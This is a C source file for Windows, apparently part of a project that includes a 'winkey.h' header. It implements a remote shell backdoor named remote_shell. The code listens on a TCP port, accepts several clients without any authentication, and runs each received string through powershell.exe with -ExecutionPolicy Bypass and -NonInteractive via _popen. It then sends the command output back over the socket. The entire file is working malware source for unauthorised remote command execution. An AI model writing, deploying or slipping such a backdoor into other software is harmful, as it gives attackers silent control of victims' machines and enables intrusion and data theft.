#include <winkey.h>

char    *CommandCpy(char *recvbuf)
{
    char    *pwshell = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ";
    size_t  len = strlen(pwshell) + strlen(recvbuf) + 3;
    char    *cmd = malloc(sizeof(char) * len);

    snprintf(cmd, len, "%s\"%s\"", pwshell, recvbuf);
    return (cmd);
}
int  init_socket(SOCKET *ListenSocket)
{
    int iResult = 0;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0 )
    {
        WSACleanup();
        return (-10);
    }

    *ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (*ListenSocket == INVALID_SOCKET)
    {
        freeaddrinfo(result);
        WSACleanup();
        return (-10);
    }
    iResult = bind(*ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        freeaddrinfo(result);
        closesocket(*ListenSocket);
        WSACleanup();
        return (-10);
    }
    freeaddrinfo(result);
    iResult = listen(*ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        closesocket(*ListenSocket);
        WSACleanup();
        return (-10);
    }
    return (iResult);
}

DWORD WINAPI remote_shell(void* args) 
{
    WSADATA wsaData;
    SOCKET  ListenSocket = INVALID_SOCKET;
    SOCKET  clients[MAX_CLIENTS];

    (void*)args = NULL;

    int     i = 0;
    int     iResult = 0;

    fd_set          readfds;
    struct timeval  timeout;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0)
        return (1);
    iResult = init_socket(&ListenSocket);
    if (iResult == -10)
        return (1);
    DBG("SOCKET: %i\n", iResult);
    for (i = 0; i < MAX_CLIENTS; i++)
        clients[i] = INVALID_SOCKET;

    while(1)
    {
            FD_ZERO(&readfds);
            FD_SET(ListenSocket, &readfds);

            for (i = 0; i < MAX_CLIENTS; i++)
            {
                if (clients[i] != INVALID_SOCKET)
                    FD_SET(clients[i], &readfds);
            }
        
            timeout.tv_sec = 30;
            timeout.tv_usec = 0;
        
            int activity = select(0, &readfds, NULL, NULL, &timeout);
        
            if (activity == SOCKET_ERROR)
                break;
            if (FD_ISSET(ListenSocket, &readfds))
            {
                SOCKET newSocket = accept(ListenSocket, NULL, NULL);
                if (newSocket != INVALID_SOCKET)
                {
                    for (i = 0; i < MAX_CLIENTS; i++)
                    {
                        if (clients[i] == INVALID_SOCKET)
                        {
                            clients[i] = newSocket;
                            DBG("New client: %d\n", newSocket);
                            break ;
                        }
                    }
                }

            }

        for (i = 0; i < MAX_CLIENTS; i++)
        {
            SOCKET s = clients[i];
            if (s != INVALID_SOCKET && FD_ISSET(s, &readfds))
            {
                char recvbuf[DEFAULT_BUFLEN];
                int ret = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);

                if (ret <= 0)
                {
                    DBG("Client disconnected\n");
                    closesocket(s);
                    clients[i] = INVALID_SOCKET;
                    continue;
                }

                recvbuf[ret] = 0;

                char *cmd = CommandCpy(recvbuf);
                FILE *pPipe = _popen(cmd, "r");
                free(cmd);

                char output[4096] = {0};
                char psBuffer[512];

                if (pPipe)
                {
                    while (fgets(psBuffer, sizeof(psBuffer), pPipe))
                    {
                        size_t len = strlen(output);
                        if (len < sizeof(output))
                            snprintf(output + len, sizeof(output) - len, "%s", psBuffer);
                        else
                            break ;
                    }

                }

                send(s, output, (int)strlen(output), 0);
            }
        }
    }
    return (0);
}